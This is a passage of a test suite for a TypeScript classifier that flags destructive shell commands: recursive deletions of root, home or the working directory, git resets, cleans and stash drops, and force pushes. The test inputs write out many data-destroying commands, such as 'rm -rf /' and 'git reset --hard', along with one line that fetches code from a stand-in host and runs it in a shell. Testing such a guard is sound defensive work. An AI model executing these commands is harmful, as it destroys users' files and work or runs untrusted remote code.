import { describe, expect, test } from "bun:test";
import { classify, type Context, FORCE_PUSH_REASON, NO_VERIFY_REASON, neutralizeQuotedPositions, RM_CATASTROPHIC_REASON, shellWords } from "./destructive.ts";
import type { DiscardOperation } from "./git-state.ts";

const catastrophic = (command: string, ctx?: Context) => expect(classify(command, ctx)?.kind).toBe("catastrophic");
const reasonOf = (command: string, ctx?: Context) => {
  const finding = classify(command, ctx);
  return finding?.kind === "removal" ? undefined : finding?.reason;
};
const operationsOf = (command: string, ctx?: Context) => {
  const finding = classify(command, ctx);
  return finding?.kind === "git" ? finding.checks.map((check) => check.operation) : finding?.kind;
};
const check = (command: string, ...operations: DiscardOperation[]) => expect(operationsOf(command)).toEqual(operations);
const none = (command: string, ctx?: Context) => expect(classify(command, ctx)).toBeUndefined();
const runs = (command: string, ctx?: Context) => expect(classify(command, ctx)).toEqual({ kind: "removal" });

test("git reset --hard HEAD~1 is checked against the repository", () => check("git reset --hard HEAD~1", "git reset --hard"));
test("git reset --hard (no args) is checked against the repository", () => check("git reset --hard", "git reset --hard"));
test("git clean -fd is checked against the repository", () => check("git clean -fd", "git clean"));
test("git stash drop and git stash clear are checked against the repository", () => {
  check("git stash drop", "git stash drop");
  check("git stash drop stash@{1}", "git stash drop");
  check("git stash -q clear", "git stash clear");
});

describe("a git command that names its paths, or keeps the work, runs", () => {
  test.each([
    "git stash",
    "git stash push",
    "git stash push -m wip",
    "git stash pop",
    "git stash apply",
    "git checkout -- src/foo.py",
    "git restore foo.py",
    "git restore --worktree src/a.ts src/b.ts",
    "git rm -r vendor/",
    "git rm -rf .",
  ])("%s is not a match", (command) => none(command));
});

describe("options after the operands", () => {
  test.each(["rm ~ -rf", "rm / -rf", "sudo rm / -rf", "rm -f ~ -r", "rm ./* -rf", "rm ~ --recursive", "rm --rec ~", "rm -rf --no-pres /tmp/x"])(
    "%s is catastrophic",
    (command) => catastrophic(command),
  );

  test("a recursive flag after the path still makes a removal", () => runs("rm build -rf"));
  test("each rm in one argument list is one removal", () => runs("rm -rf rm -rf /tmp/x"));

  test.each(["rm -f x -v", "rm -- -rf", "rm x --verbose"])("%s is not recursive", (command) => none(command));

  test.each([
    ["git reset HEAD~1 --hard", "git reset --hard"],
    ["git reset --har", "git reset --hard"],
    ["x=`git reset HEAD --hard`; echo ok", "git reset --hard"],
    ["git restore --staged --worktree .", "git restore ."],
    ["git restore -SW .", "git restore ."],
    ["git restore -s HEAD .", "git restore ."],
    ["git restore . --source HEAD~2", "git restore ."],
  ] as const)("%s is checked against the repository", (command, operation) => check(command, operation));

  test.each(["git reset -- --hard", "echo `git reset` --hard", "git rm --cached vendor"])("%s is not a match", (command) => none(command));
});

describe("a restore that only unstages", () => {
  test.each(["git restore --staged a.ts", "git restore -S a.ts", "git restore --sta a.ts", "git restore --source=HEAD --staged a.ts"])(
    "%s is not a match",
    (command) => none(command),
  );
});

test("git status is not a match", () => none("git status"));
test("git log is not a match", () => none("git log"));
test("git diff is not a match", () => none("git diff"));
test("git commit -m is not a match", () => none('git commit -m "msg"'));
test("git push is not a match", () => none("git push"));
test("git pull is not a match", () => none("git pull"));
test("git fetch is not a match", () => none("git fetch"));
test("git blame foo.py is not a match", () => none("git blame foo.py"));
test("git bisect start is not a match", () => none("git bisect start"));
test("git rebase main is not a match", () => none("git rebase main"));

test("git stash drop followed by a semicolon is checked", () => check("git stash drop; echo ok", "git stash drop"));
test("git stash clear backgrounded is checked", () => check("git stash clear&", "git stash clear"));
test("git stash drop piped is checked", () => check("git stash drop|cat", "git stash drop"));
test("git stash drop inside a substitution is checked", () => check("echo $(git stash drop)", "git stash drop"));
test("git clean redirected is checked", () => check("git clean >/tmp/out", "git clean"));
test("sudo git clean -fdx is checked", () => check("sudo git clean -fdx", "git clean"));
test("sudo git reset --hard is checked", () => check("sudo git reset --hard", "git reset --hard"));

test("git cleanup is not a match", () => none("git cleanup"));
test("git stashy is not a match", () => none("git stashy"));
test("git checkout --detach is not a match", () => none("git checkout --detach"));
test("git checkout --track origin/x is not a match", () => none("git checkout --track origin/x"));
test("git checkout -- . is checked", () => check("git checkout -- .", "git checkout ."));

test("checkout of a revision followed by -- . is checked", () =>
  check("git checkout HEAD -- .", "git checkout ."));
test("a -C redirected reset --hard is checked", () => check("git -C /repo reset --hard", "git reset --hard"));
test("a --git-dir redirected reset --hard is checked", () =>
  check("git --git-dir=/repo/.git reset --hard", "git reset --hard"));
test("a -c config-override reset --hard is checked", () =>
  check("git -c user.name=x reset --hard", "git reset --hard"));
test("a quoted subcommand is checked", () => check('git "reset" --hard', "git reset --hard"));

test("a commit message naming the subcommand in parens is not a match", () =>
  none('git commit -m "restore state (git stash used)"'));
test("a read-only log pickaxe search in parens is not a match", () =>
  none('git log --oneline -S "(git restore)"'));
test("a chained checkout with a later -- token is not a match", () =>
  none("git checkout main && echo -- x"));

test("git rm --cached is not a match", () => none("git rm --cached secrets.env"));
test("git rm of a single file is not a match", () => none("git rm stale.txt"));
test("a space-separated --git-dir reset --hard is checked", () =>
  check("git --git-dir /r/.git reset --hard", "git reset --hard"));
test("a space-separated --work-tree reset --hard is checked", () =>
  check("git --work-tree /w reset --hard", "git reset --hard"));
test("a --no-pager reset --hard is checked", () => check("git --no-pager reset --hard", "git reset --hard"));
test("an attached -c config override reset --hard is checked", () =>
  check("git -cuser.name=x reset --hard", "git reset --hard"));
test("a --bare clean -fdx is checked", () => check("git --bare clean -fdx", "git clean"));
test("git --no-pager log is not a match", () => none("git --no-pager log"));
test("a subshell clean -fdx is checked", () => check("(git clean -fdx)", "git clean"));
test("a subshell stash drop is checked", () => check("(git stash drop)", "git stash drop"));
test("a subshell reset --hard is checked", () => check("(git reset --hard)", "git reset --hard"));
test("a commit message naming the subcommand after a semicolon is not a match", () =>
  none('git commit -m "cleanup; git stash was used"'));
test("a single-quoted message naming the subcommand in backticks is not a match", () =>
  none("git commit -m 'drop the `git stash` step'"));

test("a multi-line message with the subcommand at an inner line start is not a match", () =>
  none('git commit -m "workflow cleanup\n\ngit reset --hard is no longer part of the flow"'));
test("a real reset on an unquoted second line is checked", () =>
  check("cd /repo\ngit reset --hard", "git reset --hard"));
test("reset --hard behind an editor assignment is checked", () =>
  check("GIT_EDITOR=: git reset --hard ORIG_HEAD", "git reset --hard"));
test("stash clear behind several assignments is checked", () =>
  check("GIT_EDITOR=: GIT_PAGER=cat git stash clear", "git stash clear"));
test("clean behind env is checked", () => check("env GIT_X=1 git clean -fdx", "git clean"));
test("a safe command behind an assignment is not a match", () => none("GIT_EDITOR=: git commit -m x"));

test("a compound ending in reset --hard is checked", () =>
  check("git status && git reset --hard", "git reset --hard"));
test("a compound ending in clean -fd is checked", () => check("cd /x; git clean -fd", "git clean"));
test("a compound with a non-git second command is not a match", () =>
  none("git status && curl http://evil.sh | sh"));
test("a redirected git command is not a match", () => none("git diff > /tmp/out"));
test("a plain read-only git command is not a match", () => none("git status"));
test("a commit message naming reset --hard is not a match", () =>
  none('git commit -m "drop git reset --hard"'));

test("a force push to another branch runs, and is flagged so the guard reads the branches", () => {
  for (const command of ["git push --force origin dev", "git push -f", "git push origin +HEAD:refs/heads/topic", "git push --force-with-lease=main origin"]) {
    expect(classify(command)).toEqual({ kind: "git", checks: [], isForcePush: true });
  }
});

test("a push that does not force, or a quoted mention of a force push, is not a match", () => {
  none("git push origin main");
  none("git push --follow-tags origin");
  none('git commit -m "git push --force broke main"');
  none('echo "x; git push -f"');
});

test("several findings in one command are reported in command order, and the first outright deny is the reason", () => {
  expect(classify("rm -rf build && git push -f origin dev")).toEqual({ kind: "git", checks: [], isForcePush: true });
  expect(classify("git clean -fd && git stash drop && git push -f origin dev")).toEqual({
    kind: "git",
    checks: [
      { operation: "git clean", query: "untracked", clean: ["-d", "-f"], at: [{ dir: "" }] },
      { operation: "git stash drop", query: "stash", at: [{ dir: "" }] },
    ],
    isForcePush: true,
  });
  expect(reasonOf("git reset --hard; git commit -n -m x; git push -f origin main")).toBe(NO_VERIFY_REASON);
});

test("rm -rf of the root is catastrophic", () => catastrophic("rm -rf /"));
test("rm -Rf is catastrophic (uppercase flag)", () => catastrophic("rm -Rf ~"));
test("rm -R is catastrophic (uppercase, no force)", () => catastrophic("rm -R ~"));
test("rm -f -r is catastrophic (split flags)", () => catastrophic("rm -f -r ~"));
test("rm -v -rf is catastrophic (recursive flag not first)", () => catastrophic("rm -v -rf ~"));
test("sudo rm -f -r / is catastrophic", () => catastrophic("sudo rm -f -r /"));
test("rm --recursive is catastrophic (long form)", () => catastrophic("rm --recursive ~"));
test("rm -f of a single file is not a match", () => none("rm -f /tmp/one.txt"));
test("rm --force of a single file is not a match", () => none("rm --force /tmp/one.txt"));
test("an unknown command is not a match", () => none("python3 script.py"));
test("sudo rm -rf of the root is catastrophic", () => catastrophic("sudo rm -rf /"));

test("&& compound ending in rm -rf of a home path is catastrophic", () => catastrophic("cd /x && rm -rf ~/y"));
test("&& compound ending in sudo rm -rf of root is catastrophic", () =>
  catastrophic("echo hi && sudo rm -rf /"));
test("semicolon compound ending in rm -rf is catastrophic", () => catastrophic("cd /x; rm -rf /usr"));
test("newline-separated rm -rf is catastrophic", () => catastrophic("cd /x\nrm -rf ~/y"));
test("rm -rf with a dollar-paren substitution target is catastrophic", () => catastrophic("rm -rf $(echo ~)"));
test("rm -rf with a backquote substitution target is catastrophic", () => catastrophic("rm -rf `echo ~`"));
test("rm -rf inside a substitution is catastrophic", () => catastrophic("echo $(rm -rf ~/y)"));
test("leading-whitespace rm -rf is catastrophic", () => catastrophic("   rm -rf /"));
test("grep for the text of an rm -rf command is not a match", () => none('grep -rn "rm -rf" scripts/'));
test("single-quoted grep for the text of an rm -rf command is not a match", () =>
  none("grep -rn 'rm -rf' ."));

test("grep whose pattern is the text of an rm -rf is not a match", () =>
  none('grep -rn "rm -rf /" scripts/'));
test("a commit message naming rm -rf is not a match", () =>
  none('git commit -m "stop using rm -rf"'));
test("rm with no recursive flag is not a match", () => none("rm -f stale.lock"));
test("rmdir is not a match", () => none("rmdir /tmp/emptydir"));
test("a read-only command is not a match", () => none("ls -la /home/u"));

test("a recursive rm of a nested temp path runs", () => runs("rm -rf /tmp/omca-canary"));
test("a loop cleaning a pid-suffixed scratch dir runs", () =>
  runs('for d in a b; do mkdir -p /tmp/x$$; dpkg-deb -x $d/p.deb /tmp/x$$; md5sum $(find /tmp/x$$ -name "*.so"); rm -rf /tmp/x$$; done'));
test("a recursive rm of relative build dirs runs", () =>
  runs("cd /x && rm -rf build dist/out"));
test("a recursive rm two levels under home runs", () => runs("rm -rf ~/.cache/foo"));
test("a deeper variable-led path runs", () => runs("rm -rf $DIR/build/out"));
test("a quoted target with a space is one target", () => runs('rm -rf "my build" -- -odd'));

test("a directory directly under root is catastrophic", () => catastrophic("rm -rf /usr/*"));
test("a directory directly under home is catastrophic", () => catastrophic("rm -rf $HOME/dev"));
test("a glob of the working directory is catastrophic", () => catastrophic("rm -rf ./*"));
test("a parent-directory target is catastrophic", () => catastrophic("rm -rf a/../.."));
test("a variable-led path that is root-level when empty is catastrophic", () => catastrophic("rm -rf $DIR/*"));
test("--no-preserve-root is catastrophic whatever the target", () =>
  catastrophic("rm -rf --no-preserve-root /tmp/a/b"));
test("a safe removal does not mask a later catastrophic one", () =>
  catastrophic("rm -rf /tmp/a/b; rm -rf ~"));

test("a multi-line message with a recursive removal at an inner line start is not a match", () =>
  none('git commit -m "refactor hooks\n\nrm -rf calls were replaced by explicit deletes"'));
test("a multi-line message with a recursive removal mid-line is not a match", () =>
  none('git commit -m "refactor hooks\n\nwe dropped the rm -rf call here"'));
test("a real recursive removal on an unquoted second line is still catastrophic", () =>
  catastrophic("cd /tmp\nrm -rf *"));
test("a real recursive removal after && is still catastrophic", () => catastrophic("git status && rm -rf .."));

test("rm -rf behind a variable assignment is catastrophic", () => catastrophic("FOO=1 rm -rf /"));
test("rm -rf behind a quoted assignment is catastrophic", () => catastrophic('X="a b" rm -rf ~'));
test("rm -rf behind env is catastrophic", () => catastrophic("env FOO=1 rm -rf ."));
test("an rm mention after a non-assignment word is not a removal", () => none("echo FOO=1 rm -rf x"));

test("rm -rf of home is catastrophic", () => catastrophic("rm -rf ~"));
test("the catastrophic reason names the protected path", () => expect(reasonOf("rm -rf ~")).toBe(RM_CATASTROPHIC_REASON));
test("rm -r of a directory under the root is catastrophic", () => catastrophic("rm -r /opt"));
test("sudo rm -rf of a directory under the root is catastrophic", () => catastrophic("sudo rm -rf /var"));
test("an inline rmdir is not a match", () => none("rmdir foo"));
test("sudo apt-get install is not a match", () =>
  none("sudo apt-get install build-essential"));

test("quoted command-position characters are blanked without changing the length", () => {
  const command = `echo "a; b | (c)" 'd $(e) \`f\`' g; h`;
  expect(neutralizeQuotedPositions(command)).toBe(`echo "a_ b _ _c_" 'd __e_ _f_' g; h`);
  expect(neutralizeQuotedPositions(command)).toHaveLength(command.length);
});

test("shell words drop quotes and keep a quoted space inside its word", () => {
  expect(shellWords(` a "b c" 'd'e "" `)).toEqual(["a", "b c", "de", ""]);
});

const bashIn = (ctx: Omit<Context, "shell">): Context => ({ shell: "bash", ...ctx });
const POSIX_SESSION = bashIn({ home: "/home/bob", cwd: "/home/bob/proj/sub", root: "/home/bob/proj" });
const MAC_SESSION = bashIn({ home: "/Users/bob", cwd: "/Users/bob/proj" });
const WINDOWS_SESSION = bashIn({ home: "C:\\Users\\x", cwd: "C:\\Users\\x\\proj", root: "C:\\Users\\x\\proj" });

const classOf = (command: string, ctx?: Context) => classify(command, ctx)?.kind ?? "none";

describe("drive, mount and share roots", () => {
  test.each([
    ["rm -rf C:", "catastrophic"],
    ["rm -rf C:\\", "catastrophic"],
    ["rm -rf C:/", "catastrophic"],
    ["rm -rf c:/", "catastrophic"],
    ["rm -rf C:\\*", "catastrophic"],
    ["rm -rf C:\\Windows", "catastrophic"],
    ["rm -rf C:\\Windows\\*", "catastrophic"],
    ["rm -rf C:\\Windows\\System32", "removal"],
    ["rm -rf /c", "catastrophic"],
    ["rm -rf /mnt/c", "catastrophic"],
    ["rm -rf /mnt/c/Users/bob/build", "removal"],
    ["rm -rf /mnt/data", "removal"],
    ["rm -rf /c/Users", "removal"],
    ["rm -rf /d/build", "removal"],
    ["rm -rf /cygdrive/c/Users", "removal"],
    ["rm -rf /Volumes/Backup/Users", "removal"],
    ["rm -rf \\\\srv\\share", "catastrophic"],
    ["rm -rf //srv/share", "catastrophic"],
    ["rm -rf //srv/share/*", "catastrophic"],
    ["rm -rf //srv/share/builds", "removal"],
  ])("on Linux, %s is %s", (command, expected) => expect(classOf(command)).toBe(expected));

  test.each([
    ["rm -rf /c", "catastrophic"],
    ["rm -rf /c/", "catastrophic"],
    ["rm -rf /c/Windows", "catastrophic"],
    ["rm -rf /c/Windows/*", "catastrophic"],
    ["rm -rf /c/Windows/System32", "removal"],
    ["rm -rf /d/build", "catastrophic"],
    ["rm -rf /d/build/out", "removal"],
    ["rm -rf /cygdrive/c", "catastrophic"],
    ["rm -rf /cygdrive/c/Windows", "catastrophic"],
    ["rm -rf /mnt/c/Windows", "catastrophic"],
  ])("on Windows, %s is %s", (command, expected) => expect(classOf(command, WINDOWS_SESSION)).toBe(expected));

  test.each([
    ["rm -rf /Volumes/Macintosh\\ HD/", "catastrophic"],
    ["rm -rf '/Volumes/Macintosh HD'", "catastrophic"],
    ["rm -rf /Volumes/Backup/Users", "catastrophic"],
    ["rm -rf /Volumes/Backup/photos/2024", "removal"],
    ["rm -rf /mnt/c/Users", "removal"],
  ])("on macOS, %s is %s", (command, expected) => expect(classOf(command, MAC_SESSION)).toBe(expected));

  test("a drive root named in a mention is not a removal", () => {
    none('echo "rm -rf C:\\"');
    none('git commit -m "never rm -rf /c/Users"');
    none("rm -f C:\\one.txt");
  });
});

describe("home variables", () => {
  test.each([
    "$USERPROFILE",
    "${USERPROFILE}",
    "$env:USERPROFILE",
    "%USERPROFILE%",
    "$HOMEDRIVE$HOMEPATH",
    "${HOMEDRIVE}${HOMEPATH}",
    "$env:HOMEDRIVE$env:HOMEPATH",
  ])("rm -rf %s is catastrophic alone and with a glob under it", (home) => {
    expect(classOf(`rm -rf ${home}`)).toBe("catastrophic");
    expect(classOf(`rm -rf "${home}"`)).toBe("catastrophic");
    expect(classOf(`rm -rf ${home}/*`)).toBe("catastrophic");
    expect(classOf(`rm -rf ${home}\\*`)).toBe("catastrophic");
    expect(classOf(`rm -rf ${home}/dev`)).toBe("catastrophic");
    expect(classOf(`rm -rf ${home}/dev/build`)).toBe("removal");
  });

  test("a home variable followed by a suffix is not home", () => {
    expect(classOf("rm -rf $USERPROFILE.bak")).toBe("removal");
  });
});

describe("a variable that is always set", () => {
  test.each([
    'rm -rf "$TMPDIR/foo"',
    "rm -rf ${TMPDIR}/foo",
    "rm -rf $TEMP/x",
    "rm -rf $TMP/x/y",
    "rm -rf $RUNNER_TEMP/build",
    "rm -rf $XDG_CACHE_HOME/omca",
    "rm -rf ${XDG_DATA_HOME}/a/b",
    "rm -rf $env:TEMP\\x",
    "rm -rf %TEMP%\\x",
    "rm -rf $TMPDIR/*",
  ])("%s runs", (command) => expect(classOf(command)).toBe("removal"));

  test.each([
    "rm -rf $DIR/*",
    "rm -rf $DIR/build",
    "rm -rf $TMPDIR_X/foo",
    "rm -rf $TMPDIR/../..",
    "rm -rf ${XDG_CACHE_HOME}/../*",
    "rm -rf $env:LOCALAPPDATA\\*",
  ])("%s still reads as a root when the variable is empty, so it is catastrophic", (command) =>
    expect(classOf(command)).toBe("catastrophic"));

  test.each([
    ["rm -rf $LOCALAPPDATA", "catastrophic"],
    ["rm -rf $APPDATA/*", "catastrophic"],
    ["rm -rf %LOCALAPPDATA%\\..\\..", "catastrophic"],
    ["rm -rf $LOCALAPPDATA/npm-cache", "removal"],
    ["rm -rf %APPDATA%\\Code\\Cache", "removal"],
  ])("a per-user data folder or all its contents is a loss, a folder inside it is not: %s is %s", (command, expected) =>
    expect(classOf(command)).toBe(expected));

  test("a variable alone or with a dotted suffix runs", () => {
    expect(classOf("rm -rf $TMPDIR")).toBe("removal");
    expect(classOf("rm -rf $DIR")).toBe("removal");
  });
});

describe("home, the working directory and its parents in any spelling", () => {
  test.each([
    ["rm -rf /home/bob", "catastrophic"],
    ["rm -rf /home/bob/", "catastrophic"],
    ["rm -rf /home/bob/*", "catastrophic"],
    ["rm -rf /home/bob/dev", "catastrophic"],
    ["rm -rf /home/bob/dev/x", "removal"],
    ["rm -rf /home/bob/proj", "catastrophic"],
    ["rm -rf /home/bob/proj/sub", "catastrophic"],
    ["rm -rf /home/bob/proj/sub/*", "catastrophic"],
    ["rm -rf /home/bob/proj/other/../sub", "catastrophic"],
    ["rm -rf /home/bob/proj/./sub/", "catastrophic"],
    ["rm -rf /home/bob/proj/sub/build", "removal"],
    ["rm -rf /home/bob/proj/docs", "removal"],
    ["rm -rf /home/bob/proj/../..", "catastrophic"],
    ["rm -rf /home/bobby", "removal"],
    ["rm -rf /HOME/BOB/dev", "removal"],
    ["rm -rf /tmp/work", "removal"],
  ])("on posix, %s is %s", (command, expected) => expect(classOf(command, POSIX_SESSION)).toBe(expected));

  test.each([
    ["rm -rf /Users/bob/*", "catastrophic"],
    ["rm -rf /users/BOB", "catastrophic"],
    ["rm -rf /Users/Bob/Documents", "catastrophic"],
    ["rm -rf /Users/bob/Library/Caches", "removal"],
    ["rm -rf /Users/bobby", "removal"],
  ])("on macOS, %s is %s", (command, expected) => expect(classOf(command, MAC_SESSION)).toBe(expected));

  test.each([
    ["rm -rf C:\\Users\\x", "catastrophic"],
    ["rm -rf C:\\Users\\x\\*", "catastrophic"],
    ["rm -rf c:/users/X/", "catastrophic"],
    ["rm -rf /c/Users/x", "catastrophic"],
    ["rm -rf C:\\Users\\x\\proj", "catastrophic"],
    ["rm -rf C:\\Users\\x\\Documents", "catastrophic"],
    ["rm -rf C:\\Users\\x\\proj\\build", "removal"],
    ["rm -rf C:\\Users\\x\\Documents\\old", "removal"],
    ["rm -rf C:\\Users\\xavier", "removal"],
  ])("on Windows, %s is %s", (command, expected) => expect(classOf(command, WINDOWS_SESSION)).toBe(expected));

  test("with no session known, an absolute home spelling runs", () => {
    expect(classOf("rm -rf /home/bob")).toBe("removal");
    expect(classOf("rm -rf /Users/bob/*")).toBe("removal");
    expect(classOf("rm -rf C:\\Users\\x")).toBe("removal");
  });

  test("an explicit platform decides case folding", () => {
    expect(classOf("rm -rf /HOME/BOB", { shell: "bash", home: "/home/bob", platform: "win32" })).toBe("catastrophic");
    expect(classOf("rm -rf /HOME/BOB", { shell: "bash", home: "/home/bob", platform: "linux" })).toBe("removal");
  });
});

describe("command words", () => {
  test.each([
    ["git.exe reset --hard", "git reset --hard"],
    ["/usr/bin/git reset --hard", "git reset --hard"],
    ["/mingw64/bin/git stash drop", "git stash drop"],
    ['"C:\\Program Files\\Git\\cmd\\git.exe" reset --hard', "git reset --hard"],
    ["'/c/Program Files/Git/cmd/git.exe' clean -fd", "git clean"],
    ["/c/Program\\ Files/Git/cmd/git restore .", "git restore ."],
    ['git -C "C:\\My Repo" reset --hard', "git reset --hard"],
    ["git -C 'C:\\My Repo' stash clear", "git stash clear"],
    ['git --git-dir="C:\\My Repo\\.git" reset --hard', "git reset --hard"],
    ["git --git-dir '/my repo/.git' clean -fdx", "git clean"],
    ['git --work-tree "/my repo" restore .', "git restore ."],
    ["git -C /my\\ repo reset --hard", "git reset --hard"],
    ['FOO=1 "/usr/bin/git" reset --hard', "git reset --hard"],
  ] as const)("%s is checked against the repository", (command, operation) => check(command, operation));

  test.each([
    "rm.exe -rf /",
    "/usr/bin/rm -rf /",
    "command rm -rf /",
    "command -p rm -rf /",
    "\\rm -rf /",
    '"/usr/bin/rm" -rf /',
    "sudo /bin/rm -rf ~",
    "RM_X=1 rm.exe -rf $HOME",
  ])("%s is catastrophic", (command) => catastrophic(command));

  test("a path-prefixed rm of a deeper path runs", () => {
    runs("/usr/bin/rm -rf build");
    runs("rm.exe -rf 'my build'");
    runs("rm -rf my\\ build");
  });

  test("git.exe and a path-prefixed git that do not discard work are not a match", () => {
    none("git.exe status");
    none("/usr/bin/git log --oneline");
    none('"C:\\Program Files\\Git\\cmd\\git.exe" diff');
    none('git -C "C:\\My Repo" status');
  });

  test("a mention of a path-prefixed command is not a match", () => {
    none('echo "/usr/bin/rm -rf /"');
    none('grep -rn "git.exe reset --hard" docs/');
    none("ls /usr/bin/rm /usr/bin/git");
    none('git commit -m "document /usr/bin/git reset --hard"');
    none("cat /usr/bin/rm -rf");
    none("rm.exe -f stale.lock");
    none("xrm -rf /");
    none("git.exec reset --hard");
  });
});

describe("heredoc bodies", () => {
  test("the body of a quoted heredoc is text, not commands", () => {
    none("cat <<'EOF'\nrm -rf /\nEOF");
    none("cat <<'EOF' > notes.md\ngit reset --hard\nrm -rf ~\ngit push --force\nEOF");
    none('cat <<"EOF"\nrm -rf /\nEOF');
    none("cat <<\\EOF\nrm -rf /\nEOF");
    none("cat <<-'EOF'\n\trm -rf /\n\tEOF");
    none("git commit -F - <<'MSG'\nfix: stop running git reset --hard\n\nrm -rf / is gone\nMSG");
    none("cat <<'A' <<'B'\nrm -rf /\nA\ngit stash\nB");
  });

  test("a command after the terminator, or on the heredoc line, still runs", () => {
    catastrophic("cat <<'EOF'\nnotes\nEOF\nrm -rf /");
    check("cat <<'EOF' > f\nnotes\nEOF\ngit reset --hard", "git reset --hard");
    catastrophic("rm -rf / <<'EOF'\nnotes\nEOF");
    catastrophic("cat <<'A' <<'B'\nx\nA\ny\nB\nrm -rf ~");
    catastrophic("cat <<'EOF'\nEOF\nrm -rf /");
  });

  test("an unquoted heredoc still runs its substitutions, and a here-string hides nothing", () => {
    catastrophic("cat <<EOF\n$(rm -rf ~)\nEOF");
    catastrophic("cat <<<'EOF'\nrm -rf /");
    catastrophic("echo $((1 << 2))\nrm -rf /");
  });

  test("an unterminated quoted heredoc hides the rest, as the shell reads it", () => {
    none("cat <<'EOF'\nrm -rf /");
  });

  test("a heredoc keeps the length of the command", () => {
    const command = "cat <<'EOF'\nrm -rf /; x\nEOF\nls";
    expect(neutralizeQuotedPositions(command)).toBe("cat <<'EOF'\n___________\nEOF\nls");
    expect(neutralizeQuotedPositions(command)).toHaveLength(command.length);
  });

  test("a heredoc delimiter inside a quoted span opens no heredoc", () => {
    catastrophic("echo \"<<'EOF'\"\nrm -rf /");
  });
});

describe("a substitution inside double quotes", () => {
  test.each([
    'echo "$(rm -rf ~)"',
    '"$(rm -rf ~)"',
    'echo "before $(rm -rf /) after"',
    'echo "`rm -rf ~`"',
    'echo "$(echo "$(rm -rf ~)")"',
    'echo "$(echo ok; rm -rf ~)"',
    'A="$(rm -rf ~)" true',
    'echo "$((1 + 2))" && rm -rf ~',
    'rm -rf "$(echo ~)"',
    'rm -rf "$(pwd)/$(date)"',
    'rm -rf "$(dirname "$PWD")"',
    'rm -rf "`echo ~`"',
  ])("%s is catastrophic", (command) => catastrophic(command));

  test.each([
    ['echo "$(git stash drop)"', "git stash drop"],
    ['echo "`git reset --hard`"', "git reset --hard"],
    ['git commit -m "$(git clean -fd)"', "git clean"],
  ] as const)("%s is checked against the repository", (command, operation) => check(command, operation));

  test("a removal that is only a mention beside a substitution is not a match", () => {
    none("echo '$(rm -rf ~)'");
    none("echo '`rm -rf ~`'");
    none('echo "\\$(rm -rf ~)"');
    none('echo "\\`rm -rf ~\\`"');
    none('echo "\\\\\\$(rm -rf ~)"');
    none('echo "$(date)" "; rm -rf ~"');
    none('echo "$(date)" "rm -rf ~"');
    none('echo "$((1 + 2))" "(rm -rf ~)"');
    none('echo "$(echo "x")" "; git stash"');
    none('git commit -m "fix $(date): stop calling rm -rf ~"');
    none('echo "$(echo "a; rm -rf ~")"');
  });

  test("a substitution that runs something harmless is not a match", () => {
    none('echo "$(date)"');
    none('echo "`date`"');
    none('git commit -m "release $(git describe --tags)"');
  });

  test("an escaped backslash does not escape the substitution after it", () => {
    catastrophic('echo "\\\\$(rm -rf ~)"');
  });

  test("the neutralized text leaves a substitution as a command and keeps the length", () => {
    const command = `echo "$(a; b) (c) \`d; e\`" '$(f)'`;
    expect(neutralizeQuotedPositions(command)).toBe(`echo "$(a; b) _c_ \`d; e\`" '__f_'`);
    expect(neutralizeQuotedPositions(command)).toHaveLength(command.length);
    expect(neutralizeQuotedPositions('"\\$(x)"')).toBe('"\\__x_"');
  });
});

describe("a relative target", () => {
  test.each([
    ["rm -rf ..", "catastrophic"],
    ["rm -rf ../sub", "catastrophic"],
    ["rm -rf ../sub/", "catastrophic"],
    ["rm -rf ../../proj", "catastrophic"],
    ["rm -rf ../../proj/*", "catastrophic"],
    ["rm -rf ../../proj/sub/..", "catastrophic"],
    ["rm -rf ./*", "catastrophic"],
    ["rm -rf ./build", "removal"],
    ["rm -rf build/out", "removal"],
    ["rm -rf ./sub", "removal"],
    ["rm -rf build/*", "removal"],
    ["rm -rf ../other", "removal"],
  ])("from the project's subdirectory, %s is %s", (command, expected) =>
    expect(classOf(command, POSIX_SESSION)).toBe(expected));

  test("a relative path below the working directory is never catastrophic, however shallow the directory", () => {
    expect(classOf("rm -rf build", bashIn({ home: "/home/bob", cwd: "/home/bob" }))).toBe("removal");
    expect(classOf("rm -rf lib", bashIn({ home: "/home/bob", cwd: "/usr" }))).toBe("removal");
    expect(classOf("rm -rf ../lib", bashIn({ home: "/home/bob", cwd: "/usr/bin" }))).toBe("removal");
  });

  test("with no working directory known, a relative path keeps the reading it had", () => {
    expect(classOf("rm -rf ../sub")).toBe("removal");
    expect(classOf("rm -rf ../sub", bashIn({ home: "/home/bob" }))).toBe("removal");
    expect(classOf("rm -rf ../sub", bashIn({ cwd: "proj/sub" }))).toBe("removal");
    expect(classOf("rm -rf ..")).toBe("catastrophic");
  });

  test("on Windows a relative path is resolved against the working directory too", () => {
    const session = bashIn({ home: "C:\\Users\\x", cwd: "C:\\Users\\x\\proj\\sub", root: "C:\\Users\\x\\proj" });
    expect(classOf("rm -rf ..\\sub", session)).toBe("catastrophic");
    expect(classOf("rm -rf ..\\..", session)).toBe("catastrophic");
    expect(classOf("rm -rf ..\\build", session)).toBe("removal");
    expect(classOf("rm -rf .\\build", session)).toBe("removal");
  });
});

describe("the working directory named as a variable or a substitution", () => {
  const SESSION = bashIn({ home: "/home/bob", cwd: "/home/bob/proj/sub", root: "/home/bob/proj" });
  const NO_CWD = bashIn({ home: "/home/bob" });

  test.each([
    'rm -rf "$(pwd)/build"',
    "rm -rf $(pwd)/build",
    'rm -rf "`pwd`/build"',
    "rm -rf `pwd`/build/out",
    'rm -rf "$PWD/build"',
    "rm -rf $PWD/build",
    "rm -rf ${PWD}/build",
    'rm -rf "${PWD}/build"',
    "rm -rf $PWD/build/*",
    "rm -rf $(pwd)/build $PWD/dist",
    'echo "$(rm -rf "$PWD/build")"',
    "echo $(rm -rf $(pwd)/build) done",
    "cd x && rm -rf $PWD/build; echo ok",
  ])("%s runs whether or not the working directory is known", (command) => {
    expect(classOf(command, SESSION)).toBe("removal");
    expect(classOf(command, NO_CWD)).toBe("removal");
    expect(classOf(command)).toBe("removal");
  });

  test.each([
    'rm -rf "$PWD"',
    "rm -rf $PWD",
    "rm -rf ${PWD}",
    "rm -rf $(pwd)",
    'rm -rf "$(pwd)"',
    "rm -rf `pwd`",
    "rm -rf $(pwd)/..",
    'rm -rf "$PWD/.."',
    "rm -rf $PWD/*",
    "rm -rf $(pwd)/*",
    "rm -rf ${PWD}/../..",
    "rm -rf $PWD/.",
  ])("%s is the working directory or a parent, so it is catastrophic", (command) => {
    expect(classOf(command, SESSION)).toBe("catastrophic");
    expect(classOf(command, NO_CWD)).toBe("catastrophic");
    expect(classOf(command)).toBe("catastrophic");
